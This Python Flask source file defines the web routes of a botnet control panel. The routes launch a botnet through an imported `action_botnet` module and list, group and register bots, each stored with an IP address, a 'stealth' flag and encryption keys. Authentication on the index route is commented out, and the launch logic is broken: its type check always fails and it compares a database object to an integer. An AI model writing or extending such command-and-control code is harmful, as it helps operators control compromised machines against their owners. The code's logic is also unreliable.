# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

from apps.bot import blueprint
from flask import render_template, request
from flask_login import login_required
from jinja2 import TemplateNotFound
import threading
from queue import Queue, Empty

from action_botnet import launch
from apps.bot.models import Bots, Running
from apps import db

@blueprint.route('/bot')
#@login_required
def bot_index():
    return render_template('home/bot/bot.html', segment='bot')

@blueprint.route('/bot/launch',methods=['GET', 'POST'])
def bot_launch():
        output = request.form.to_dict()
        name = output['name']

        queue_web = Queue()
        try :
            if name is not int :
                return render_template('home/bot/bot.html', segment='bot', name=0)

            running = Running.query.filter_by(id=1).first()

            if running :

                if running == 1 :
                    queue_web.put('stop')
                if running == 0 :
                    thread_emission = threading.Thread(target=launch.start_botnet, args=(name, queue_web))
                    thread_emission.start()
            else :
                new_running = Running(running=0)
                db.session.add(new_running)
                db.session.commit()
                return render_template('home/bot/bot.html', segment='bot', name="Premier lancement -- initialisation terminé ! Veuillez relancer !")

            #launch.start_botnet(name, queue_web)
            print("lancement")
        except :
            return render_template('home/bot/bot.html', segment='bot', name=0)

        return render_template('home/bot/bot.html', segment='bot', name=name)

@blueprint.route('/bot/list',methods=['GET', 'POST'])
def bot_list():
    bots_all = Bots.query.all()
    return render_template('home/bot/bot-list.html', segment='bot',bots=bots_all)

@blueprint.route('/bot/group',methods=['GET', 'POST'])
def bot_group():
    return render_template('home/bot/bot-group.html', segment='bot')

@blueprint.route('/bot/action',methods=['GET', 'POST'])
def bot_action():
    return render_template('home/bot/bot-action.html', segment='bot')

#bot manuel
@blueprint.route('/bot/add',methods=['GET', 'POST'])
def bot_add():
    if request.method == 'POST':
        output = request.form.to_dict()

        new_bot = Bots(
            uid=output['uid'],
            group_id=output['group_id'],
            stealth=output['stealth'],
            multi_thread=output['multi_thread'],
            ip=output['ip'],
            sym_key=output['sym_key'],
            pub_key=output['pub_key']
        )
        db.session.add(new_bot)
        db.session.commit()

    return render_template('home/bot/bot-add.html', segment='bot')
